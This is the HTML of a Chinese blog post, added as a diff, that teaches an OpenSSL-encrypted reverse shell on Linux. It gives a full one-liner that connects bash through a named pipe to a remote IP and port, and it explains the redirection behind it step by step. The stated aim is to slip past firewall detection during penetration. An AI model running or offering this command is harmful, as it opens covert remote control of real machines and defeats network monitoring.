@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>Linuxの小伎俩-1 - Ne0AC2G&#39;s blog</title><meta name="author" content="Ne0AC2G">
+<meta name="author-link" content="https://blog.aiitoj.cn/about">
+<meta name="description" content="Linux的技巧记录" /><meta name="keywords" content='Linux' />
+  <meta itemprop="name" content="Linuxの小伎俩-1">
+  <meta itemprop="description" content="Linux的技巧记录">
+  <meta itemprop="datePublished" content="2023-01-30T22:18:32+08:00">
+  <meta itemprop="dateModified" content="2023-01-30T22:18:32+08:00">
+  <meta itemprop="wordCount" content="2256">
+  <meta itemprop="image" content="http://localhost:1313/test.jpg">
+  <meta itemprop="keywords" content="Linux"><meta property="og:url" content="http://localhost:1313/posts/linux%E3%81%AE%E5%B0%8F%E4%BC%8E%E4%BF%A9/">
+  <meta property="og:site_name" content="Ne0AC2G&#39;s blog">
+  <meta property="og:title" content="Linuxの小伎俩-1">
+  <meta property="og:description" content="Linux的技巧记录">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2023-01-30T22:18:32+08:00">
+    <meta property="article:modified_time" content="2023-01-30T22:18:32+08:00">
+    <meta property="article:tag" content="Linux">
+    <meta property="og:image" content="http://localhost:1313/test.jpg">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/test.jpg">
+  <meta name="twitter:title" content="Linuxの小伎俩-1">
+  <meta name="twitter:description" content="Linux的技巧记录">
+<meta name="application-name" content="Ne0AC2G&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="Ne0AC2G&#39;s blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="canonical" href="http://localhost:1313/posts/linux%E3%81%AE%E5%B0%8F%E4%BC%8E%E4%BF%A9/" /><link rel="prev" href="http://localhost:1313/posts/xctf-gfsj0381-echo-server/" /><link rel="next" href="http://localhost:1313/posts/cve-2023-21716%E5%A4%8D%E7%8E%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "Linuxの小伎俩-1",
+    "inLanguage": "zh-CN",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/localhost:1313\/posts\/linux%E3%81%AE%E5%B0%8F%E4%BC%8E%E4%BF%A9\/"
+    },"genre": "posts","keywords": "Linux","wordcount":  2256 ,
+    "url": "http:\/\/localhost:1313\/posts\/linux%E3%81%AE%E5%B0%8F%E4%BC%8E%E4%BF%A9\/","datePublished": "2023-01-30T22:18:32+08:00","dateModified": "2023-01-30T22:18:32+08:00","publisher": {
+      "@type": "Organization",
+      "name": "Ne0AC2G"},"author": {
+        "@type": "Person",
+        "name": "Ne0AC2G"
+      },"description": "Linux的技巧记录"
+  }
+  </script></head>
+  <body data-header-desktop="fixed" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="Ne0AC2G&#39;s blog"><span class="header-title-text">Ne0AC2G&#39;s blog</span></a></div>
+    <nav>
+      <ul class="menu"><li class="menu-item text-center">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-book fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> 文章</a></li><li class="menu-item text-center">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li class="menu-item text-center">
+              <a
+                class="menu-link"
+                href="/friends/"
+                
+                
+              ><i class="fa-solid fa-users fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item text-center">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-solid fa-info-circle fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容 ..." id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li>
+      </ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="Ne0AC2G&#39;s blog"><span class="header-title-text">Ne0AC2G&#39;s blog</span></a></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容 ..." id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li
+              class="menu-item text-center"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-book fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> 文章</a></li><li
+              class="menu-item text-center"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li
+              class="menu-item text-center"
+            ><a
+                  class="menu-link"
+                  href="/friends/"
+                  
+                  
+                ><i class="fa-solid fa-users fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li
+              class="menu-item text-center"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-solid fa-info-circle fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container" data-page-style="normal"><aside class="toc" id="toc-auto"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside>
+
+  <aside class="aside-custom">
+    
+</aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX">
+        <span>Linuxの小伎俩-1</span>
+      </h1><p class="single-subtitle animate__animated animate__fadeIn">笔记</p></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><a href="https://blog.aiitoj.cn/about" title="作者"target="_blank" rel="external nofollow noopener noreferrer author" class="author"><img
+    class="lazyload avatar"
+    src="/svg/loading.min.svg"
+    data-src="/test.jpg"
+    data-srcset="/test.jpg, /test.jpg 1.5x, /test.jpg 2x"
+    data-sizes="auto"
+    alt="Ne0AC2G"
+    title="Ne0AC2G"/>&nbsp;Ne0AC2G</a></span></div>
+      <div class="post-meta-line"><span title=2023-01-30&#32;22:18:32><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-01-30">2023-01-30</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 2256 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 5 分钟</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#起因">起因</a>
+      <ul>
+        <li><a href="#openssl--bash">Openssl &amp; Bash</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div
+      class="content"
+      id="content"
+      
+      
+    ><figure><img src="/posts/linux%E3%81%AE%E5%B0%8F%E4%BC%8E%E4%BF%A9/img/background-long.jpg" width="100%">
+</figure>
+
+<h2 id="起因">起因</h2>
+<p>在最近的生活中，经常需要在渗透场景下拿到Shell从而进一步对于靶机的控制以及横向移动等操作（其实是拿到Shell好敲command的罢了），但毕竟在内网的环境中，那些防火墙也不是吃素的，如果只是使用常用的反弹shell操作也是很容易被监测到的（管你netcat还是调用Linux的Socket，即/dev/tcp，那都是木大木大木大），那么我们就需要在这简单的传输过程中加一点点的料从而达到伪装的效果（不然，流量裸奔？生怕防火墙眼瞎？），这时我们可以考虑加密这条通信线路从而完成对于特征检测的绕过（其实例如众所周知的冰蝎等知名内存马的基础原理也是如此，而能够穿越国境线的原理也是如此），当然了，这里不对自定义的反弹shell程序做的赘述，其实我自己也在手搓ing（内存马），下面在这里开始介绍一种较为简单的手法达成上述的功能。</p>
+<h3 id="openssl--bash">Openssl &amp; Bash</h3>
+<p>话不多说，上命令</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mkfifo /tmp/fifofile<span class="p">;</span> /bin/bash -i &lt; /tmp/fifofile 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> openssl s_client -quiet -connect 39.101.74.100:1234 &gt; /tmp/fifofile<span class="p">;</span> rm /tmp/fifofile
+</span></span></code></pre></div><p>这里需要注意<code>39.101.74.100:1234</code>，这个需要换成你用于接收shell的服务器地址和端口。</p>
+<p>一眼望去可能有的人开始头晕脑胀了，这句话究竟是在干嘛，下面我们就把这句话一段一段地来解读。其中这句话要分为三部分去看，即</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mkfifo /tmp/fifofile <span class="c1">#1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/bin/bash -i &lt; /tmp/fifofile 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="p">|</span> openssl s_client -quiet -connect 39.101.74.100:1234 &gt; /tmp/fifofile  <span class="c1">#2</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">rm /tmp/fifofile <span class="c1">#3</span>
+</span></span></code></pre></div><p>Linux的管道大家应该都知道（不知道的出门去baidu,去google），而Linux提供了FIFO文件（FIFO special files），而其又称为命名管道（named pipe），顾名思义，这个文件类似管道“PIPE”，但可被命名的，其详细特性以及两者的不同这里不赘述，自行了解(指路：<a href="https://www.gnu.org/software/libc/manual/html_node/Pipes-and-FIFOs.html"target="_blank" rel="external nofollow noopener noreferrer">GNU官网对于PIPE和FIFO的介绍</a>)，这里只需要知道是一个可以让不同进程进行通信、且以先进先出的方式进行数据读取的方式（<a href="https://www.ibm.com/docs/en/zos/2.3.0?topic=csf-fifo-special-files"target="_blank" rel="external nofollow noopener noreferrer">IBM 介绍</a>）。</p>
+<p>而我们的第一句<code>mkfifo /tmp/fifofile</code> 则是在tmp目录下创建一个名为 <strong>fifofile</strong> 的FIFO文件</p>
+<p>第二句可能有点费劲，但我已经用<code>\</code>符号把这句话隔开来读，首先关注<code>/bin/bash -i &lt; /tmp/fifofile 2&gt;&amp;1</code>这句话</p>
+<p>其中我们需要理解的部分主要是这里的<strong>流</strong>的去向究竟是怎样的，首先这里引入文件描述符的概念，见下表</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">文件描述符</th>
+<th style="text-align:center">含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">0</td>
+<td style="text-align:center">标准输入（stdin）</td>
+</tr>
+<tr>
+<td style="text-align:center">1</td>
+<td style="text-align:center">标准输出（stdout）</td>
+</tr>
+<tr>
+<td style="text-align:center">2</td>
+<td style="text-align:center">标准错误输出（stderr）</td>
+</tr>
+</tbody>
+</table>
+<p>而我们首先从简单的部分进行入手，<code>/bin/bash -i &lt; /tmp/fifofile</code>这句话是将fifo文件的内容以标准输入的方式给到bash中，其中此时的因为后面<code>2&gt;&amp;1</code>的缘故，bash执行完fifo文件内的命令后，其标准输出（1）和标准错误输出（2）一并指向标准输出，是不是很拗口？我们用一个列表表示一下：</p>
+<ul>
+<li>
+<p>最开始的<code>/bin/bash -i</code> &lt;&mdash;&mdash; 0 (stdin)</p>
+</li>
+<li>
+<p>由于使用了<code>&lt;</code>输入重定向，执行了&lt;/tmp/fifofile ，有 0&lt;&mdash;&mdash; <code>/tmp/fifofile</code></p>
+</li>
+<li>
+<p>/bin/bash这个命令执行完了总得有输出吧？，那么有</p>
+<p><code>/bin/bash &lt; /tmp/fifofile </code>&mdash;&mdash;&gt; 1(stdout)</p>
+</li>
+<li>
+<p>最后执行2&gt;&amp;1，有2(stderr) &mdash;&mdash;&gt; 1(stdout)</p>
+</li>
+<li>
+<p>现在如果不进行下面的语句，有 1 &mdash;&mdash;&gt; 屏幕 （不过按照如上的命令会卡在那，因为 -i 选项开了交互式shell &#x1f923;）</p>
+</li>
+</ul>
+<div class="details admonition tip open">
+    <div class="details-summary admonition-title">
+      <i class="icon fa-solid fa-lightbulb fa-fw" aria-hidden="true"></i>提示<i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden="true"></i>
+    </div>
+    <div class="details-content">
+      <div class="admonition-content"><p>到这里可能有人还是晕着的，在这里请务必明确一个原则，重定向的语句执行方向按照你写的重定向符号来，但是你作为人类去阅读这句话，以及Bash本身对于重定向的处理方向都是<strong>从左往右读</strong>（详情见<a href="https://www.gnu.org/savannah-checkouts/gnu/bash/manual/bash.html#Redirecting-Standard-Output-and-Standard-Error"target="_blank" rel="external nofollow noopener noreferrer">Bash Reference Manual</a> 3.6节第一大段）</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="/posts/linux%E3%81%AE%E5%B0%8F%E4%BC%8E%E4%BF%A9/img/2023-01-31-11-03-50.png"
+    data-srcset="/posts/linux%E3%81%AE%E5%B0%8F%E4%BC%8E%E4%BF%A9/img/2023-01-31-11-03-50.png, /posts/linux%E3%81%AE%E5%B0%8F%E4%BC%8E%E4%BF%A9/img/2023-01-31-11-03-50.png 1.5x, /posts/linux%E3%81%AE%E5%B0%8F%E4%BC%8E%E4%BF%A9/img/2023-01-31-11-03-50.png 2x"
+    data-sizes="auto"
+    alt="/posts/linux%E3%81%AE%E5%B0%8F%E4%BC%8E%E4%BF%A9/img/2023-01-31-11-03-50.png"
+    title="/posts/linux%E3%81%AE%E5%B0%8F%E4%BC%8E%E4%BF%A9/img/2023-01-31-11-03-50.png" width="998" height="254"/></p>
+<p>不过在我对<code>2&gt;&amp;1</code>祖坟上刨根前，也疑惑一个错误输出的重定向直接2&gt;1不就完活了吗，但也注意到这样的句子会有歧义（Bash：我咋知道你是重定向给标准输出，还是重定向给文件名为<code>1</code>的文件？），那群上世纪的老先生肯定早就想到了&#x1f606;，所以就翻到Bash Reference Manual的3.6.4节仔细看看。
+<img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="/posts/linux%E3%81%AE%E5%B0%8F%E4%BC%8E%E4%BF%A9/img/2023-01-31-11-11-17.png"
+    data-srcset="/posts/linux%E3%81%AE%E5%B0%8F%E4%BC%8E%E4%BF%A9/img/2023-01-31-11-11-17.png, /posts/linux%E3%81%AE%E5%B0%8F%E4%BC%8E%E4%BF%A9/img/2023-01-31-11-11-17.png 1.5x, /posts/linux%E3%81%AE%E5%B0%8F%E4%BC%8E%E4%BF%A9/img/2023-01-31-11-11-17.png 2x"
+    data-sizes="auto"
+    alt="/posts/linux%E3%81%AE%E5%B0%8F%E4%BC%8E%E4%BF%A9/img/2023-01-31-11-11-17.png"
+    title="/posts/linux%E3%81%AE%E5%B0%8F%E4%BC%8E%E4%BF%A9/img/2023-01-31-11-11-17.png" width="1052" height="553"/></p>
+<p>结果还有<code>&amp;&gt;</code>这样的写法，在没看完整段介绍前我心急地用了这个试了一下碰一鼻子灰，然后在最后一句看到说明
+<img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="/posts/linux%E3%81%AE%E5%B0%8F%E4%BC%8E%E4%BF%A9/img/2023-01-31-11-11-47.png"
+    data-srcset="/posts/linux%E3%81%AE%E5%B0%8F%E4%BC%8E%E4%BF%A9/img/2023-01-31-11-11-47.png, /posts/linux%E3%81%AE%E5%B0%8F%E4%BC%8E%E4%BF%A9/img/2023-01-31-11-11-47.png 1.5x, /posts/linux%E3%81%AE%E5%B0%8F%E4%BC%8E%E4%BF%A9/img/2023-01-31-11-11-47.png 2x"
+    data-sizes="auto"
+    alt="/posts/linux%E3%81%AE%E5%B0%8F%E4%BC%8E%E4%BF%A9/img/2023-01-31-11-11-47.png"
+    title="/posts/linux%E3%81%AE%E5%B0%8F%E4%BC%8E%E4%BF%A9/img/2023-01-31-11-11-47.png" width="1108" height="181"/></p>
+<p>使用第二种(<code>&gt;&amp;</code>)用法时，不能使用数字或者&rsquo;-&rsquo;，如果单纯看机翻，不了解数字的含义换我我也懵，这里也就很明确了，如果你用了数字，例如0/1/2，那么这句话的处理方式就不是把标准输出和标准错误输出重定向到文件里，而是<strong>文件描述符</strong>，如果仔细注意官方文档的案例，它说了<code>&amp;&gt;word</code>和<code>&gt;&amp;word</code>等价于 <code>&gt;word 2&gt;&amp;1</code>，那个2&gt;&amp;1的用途也就是定义说的那样（其实把这些东西当做指针去理解会很容易）</p>
+</div>
+    </div>
+  </div>
+<p>第二句前半段说完，我们来看看后半段，即<code>| openssl s_client -quiet -connect 39.101.74.100:1234 &gt; /tmp/fifofile</code>，上面说到bash运行之后的结果和错误都丢到标准输出中了，到这一句将通过<code>|</code>管道符，把上个命令的标准输出作为这一句的标准输入传给openssl，而s_slient参数将构造一个通用SSL/TLS客户端，而重头戏也就来了，-quiet参数会禁止打印会话以及证书信息，但同时也会开启-ign_eof选项(<a href="https://www.openssl.org/docs/man1.0.2/man1/openssl-s_client.html"target="_blank" rel="external nofollow noopener noreferrer">Openssl文档</a>)</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="/posts/linux%E3%81%AE%E5%B0%8F%E4%BC%8E%E4%BF%A9/img/2023-01-31-14-21-47.png"
+    data-srcset="/posts/linux%E3%81%AE%E5%B0%8F%E4%BC%8E%E4%BF%A9/img/2023-01-31-14-21-47.png, /posts/linux%E3%81%AE%E5%B0%8F%E4%BC%8E%E4%BF%A9/img/2023-01-31-14-21-47.png 1.5x, /posts/linux%E3%81%AE%E5%B0%8F%E4%BC%8E%E4%BF%A9/img/2023-01-31-14-21-47.png 2x"
+    data-sizes="auto"
+    alt="/posts/linux%E3%81%AE%E5%B0%8F%E4%BC%8E%E4%BF%A9/img/2023-01-31-14-21-47.png"
+    title="/posts/linux%E3%81%AE%E5%B0%8F%E4%BC%8E%E4%BF%A9/img/2023-01-31-14-21-47.png" width="1076" height="320"/></p>
+<p>翻译的意思是禁止在输入达到文件末尾时断开连接，这对于渗透场景而言是非常重要的，因为需要<strong>持久化</strong>反弹的Shell，bash的输出也就通过这个命令发给攻击者机器，同时，攻击者发送的命令，也会通过<code>&gt;</code>符号重定向输入fifo文件中，将这一系列的功能联系起来我们就能得到一个清晰的结构。
+<img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="/posts/linux%E3%81%AE%E5%B0%8F%E4%BC%8E%E4%BF%A9/img/2023-01-31-11-38-14.png"
+    data-srcset="/posts/linux%E3%81%AE%E5%B0%8F%E4%BC%8E%E4%BF%A9/img/2023-01-31-11-38-14.png, /posts/linux%E3%81%AE%E5%B0%8F%E4%BC%8E%E4%BF%A9/img/2023-01-31-11-38-14.png 1.5x, /posts/linux%E3%81%AE%E5%B0%8F%E4%BC%8E%E4%BF%A9/img/2023-01-31-11-38-14.png 2x"
+    data-sizes="auto"
+    alt="/posts/linux%E3%81%AE%E5%B0%8F%E4%BC%8E%E4%BF%A9/img/2023-01-31-11-38-14.png"
+    title="/posts/linux%E3%81%AE%E5%B0%8F%E4%BC%8E%E4%BF%A9/img/2023-01-31-11-38-14.png" width="985" height="493"/></p>
+<p>到此，也对这些指令本身的处理有了更深刻的理解，所以已经不着急东搞西搞，因为越学越发现贫瘠之处多到令人发指，天天用现成的我会睡不安，所以我选择：
+<figure><img src="/posts/linux%E3%81%AE%E5%B0%8F%E4%BC%8E%E4%BF%A9/img/2023-01-31-11-47-49.png" width="50%">
+</figure>
+</p>
+<p>搞错了&#x1f606;！git push xxxx（前面说了最近在写病毒）</p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title=2023-01-30&#32;22:18:32>更新于 2023-01-30&nbsp;</span>
+      </div></div>
+    <div class="post-info-line">
+      <div class="post-info-md"></div>
+      <div class="post-info-share">
+        <span><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="http://localhost:1313/posts/linux%E3%81%AE%E5%B0%8F%E4%BC%8E%E4%BF%A9/" data-title="Linuxの小伎俩-1"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+      </div>
+    </div>
+  </div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/linux/">Linux</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/xctf-gfsj0381-echo-server/" class="prev" rel="prev" title="GFSJ-0381-echo-server"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>GFSJ-0381-echo-server</a>
+      <a href="/posts/cve-2023-21716%E5%A4%8D%E7%8E%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/" class="next" rel="next" title="CVE-2023-21716 Microsoft Word远程代码执行漏洞（持续更新）">CVE-2023-21716 Microsoft Word远程代码执行漏洞（持续更新）<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2021 - 2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="https://blog.aiitoj.cn/about"target="_blank" rel="external nofollow noopener noreferrer">Ne0AC2G</a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div><div class="footer-line ibruce">
+          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div><div class="footer-line beian"><span class="icp footer-divider"><a href="https://beian.miit.gov.cn/" target="_blank">皖ICP备2021018266号-1</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/lunr/lunr.min.js" defer></script><script src="/lib/lunr/lunr.stemmer.support.min.js" defer></script><script src="/lib/lunr/lunr.zh.min.js" defer></script><script src="/lib/lazysizes/lazysizes.min.js" async defer></script><script src="/lib/twemoji/twemoji.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async defer></script><script>window.config={"autoBookmark":true,"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":50},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"},"twemoji":true};</script><script src="/js/theme.min.js" defer></script></body>
+</html>
